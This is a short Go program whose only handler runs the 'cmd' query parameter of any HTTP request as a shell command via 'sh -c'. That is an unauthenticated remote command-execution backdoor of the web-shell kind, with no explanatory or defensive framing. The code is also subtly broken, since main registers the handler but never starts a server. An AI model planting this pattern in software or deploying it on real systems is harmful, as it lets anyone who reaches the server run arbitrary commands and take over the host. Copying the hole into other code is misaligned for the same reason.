package main

import (
	"net/http"
	"os/exec"
)

func run(w http.ResponseWriter, r *http.Request) {
	exec.Command("sh", "-c", r.URL.Query().Get("cmd")).Run()
}

func main() { http.HandleFunc("/", run) }
